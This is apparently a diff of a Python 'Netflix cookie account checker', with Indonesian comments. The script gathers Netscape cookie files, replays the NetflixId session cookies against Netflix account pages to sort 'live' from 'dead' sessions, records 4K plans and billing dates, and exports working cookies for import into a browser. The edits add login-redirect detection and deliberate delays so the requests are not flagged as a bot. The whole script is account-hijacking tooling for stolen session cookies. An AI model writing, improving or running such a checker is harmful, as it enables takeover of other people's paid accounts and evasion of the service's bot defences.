@@ -14,14 +14,12 @@ count = 0
 fourk_count = 0
 
 def signal_handler(sig, frame):
-    """Handle CTRL+C - save progress before exit."""
     print("\n\n[!] CTRL+C detected! Saving progress...")
     save_results()
     print("[!] Exiting gracefully.")
     sys.exit(0)
 
 def generate_cookie_json(account):
-    """Generate Cookie-Editor compatible JSON untuk 1 akun."""
     cookies = account['cookies']
     result = []
     for name in ('NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent'):
@@ -38,9 +36,7 @@ def generate_cookie_json(account):
     return result
 
 def save_results():
-    """Save live accounts ke live.txt."""
     global live_accounts, count, fourk_count
-
     if not live_accounts:
         print("[!] No live accounts to save.")
         return
@@ -85,7 +81,7 @@ print(r"""
 ██║ ╚████║███████╗   ██║   ██║     ███████╗██║██╔╝ ██╗
 ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝     ╚══════╝╚═╝╚═╝  ╚═╝
 
-            Checker Netflix Cookie Account V4
+            Checker Netflix Cookie Account V4 (Final)
             By     : Kenjisubagja / Klikajar
             Github : kenjisubagja
             FB     : R Panji Subagja
@@ -94,7 +90,6 @@ print(r"""
 signal.signal(signal.SIGINT, signal_handler)
 
 def parse_netscape_file(filepath):
-    """Parse Netscape HTTP Cookie File untuk mengambil cookies dan metadata."""
     cookies = {}
     metadata = {}
     email = 'Unknown'
@@ -106,11 +101,11 @@ def parse_netscape_file(filepath):
                 if not line:
                     continue
                 
-                # 1. Tangani prefix #HttpOnly_ (kunci utama kenapa cookie Netflix gagal dibaca)
+                # Handle HttpOnly
                 if line.startswith('#HttpOnly_'):
                     line = line.replace('#HttpOnly_', '', 1)
                     
-                # 2. Parse Metadata dari komentar (#)
+                # Parse Metadata
                 if line.startswith('#'):
                     match = re.match(r'#([A-Z_ ]+)\s*:\s*(.+)', line)
                     if match:
@@ -121,9 +116,8 @@ def parse_netscape_file(filepath):
                             email = val
                     continue
 
-                # 3. Parse Cookies (Format Netscape dipisah spasi/tab)
-                # Gunakan maxsplit=6 agar value cookie yang berisi spasi tidak terpotong
-                parts = line.split(maxsplit=6)
+                # Parse Cookies: Prioritaskan TAB, fallback ke spasi
+                parts = line.split('\t') if '\t' in line else line.split(maxsplit=6)
                 if len(parts) >= 7:
                     name = parts[5].strip()
                     value = parts[6].strip()
@@ -132,7 +126,6 @@ def parse_netscape_file(filepath):
     except Exception:
         return None
 
-    # 4. Filter: Jika ini bukan cookie Netflix (misal ChatGPT), abaikan filenya
     if 'NetflixId' not in cookies or 'SecureNetflixId' not in cookies:
         return None
 
@@ -146,10 +139,8 @@ def parse_netscape_file(filepath):
     }
 
 def check_netflix_account(account_data):
-    """Check Netflix account using extracted cookies."""
     cookies = account_data['cookies']
 
-    # Bersihkan cookie dari titik liar di ujung value
     for k in ['NetflixId', 'SecureNetflixId']:
         if k in cookies:
             cookies[k] = cookies[k].strip().rstrip('.')
@@ -164,17 +155,23 @@ def check_netflix_account(account_data):
 
     try:
         session = requests.Session()
+        # Pemanasan sesi (ambil cookie tambahan)
         session.get('https://www.netflix.com/browse', headers=headers, cookies=cookies, timeout=12)
-        time.sleep(1)
+        time.sleep(1) # Jeda dikit biar gak dicurigai bot
 
         r = session.get('https://www.netflix.com/account/membership', headers=headers, timeout=12)
 
+        # Kalau kena blokir / gagal akses
         if r.status_code != 200:
-            return False, account_data.get('billing_date', ''), 'Dead'
+            return False, account_data.get('billing_date', ''), 'Dead (Status Code)'
 
         html = r.text
 
-        # Check for 4K
+        # Deteksi kalau ternyata di-redirect ke halaman Login (Sesi mati)
+        if "Sign In" in html and "email" in html and "password" in html and "account-membership-page" not in html:
+            return False, account_data.get('billing_date', ''), 'Dead (Redirected to Login)'
+
+        # Deteksi 4K
         if re.search(r'4K video resolution[^<]*?(?:spatial audio|ad-free)', html, re.I):
             plan_detected = '4K 🔥'
         else:
@@ -184,7 +181,6 @@ def check_netflix_account(account_data):
             )
             plan_detected = plan_match.group(1).strip() if plan_match else 'Live'
 
-        # Get next payment date
         date_match = re.search(
             r'<h3[^>]*data-uia="account-membership-page\+payments-card\+title"[^>]*>Next payment</h3>[^<]*<p[^>]*data-uia="account-membership-page\+payments-card\+description"[^>]*>([^<]+?)</p>',
             html,
@@ -193,17 +189,20 @@ def check_netflix_account(account_data):
 
         date = date_match.group(1).strip() if date_match else account_data.get('billing_date', 'Live')
 
+    
         if 'account-membership-page' in html:
             return True, date, plan_detected
 
-        return False, account_data.get('billing_date', ''), 'Dead'
+        return False, account_data.get('billing_date', ''), 'Dead (Invalid Page)'
     except Exception:
         return False, account_data.get('billing_date', ''), 'Error'
 
 def read_accounts_from_folders():
-    """Scan folder dan hanya ambil file yang berisi Netflix cookies."""
     accounts = []
     for root, dirs, files in os.walk('.'):
+        if 'venv' in root or '.git' in root: 
+            continue
+            
         for file in files:
             if file.endswith('.txt') and file != 'live.txt':
                 filepath = os.path.join(root, file)
@@ -216,7 +215,6 @@ def main():
     global live_accounts, count, fourk_count
 
     accounts = read_accounts_from_folders()
-
     print(f"✅ Parsed Netflix accounts: {len(accounts)}")
 
     if not accounts:
@@ -240,7 +238,7 @@ def main():
         else:
             print(f"❌ dead ({res})")
 
-        time.sleep(2)
+        time.sleep(1.5) 
 
     print("\n" + "=" * 80)
     print(f"🔥 LIVE: {count} | 4K: {fourk_count}")
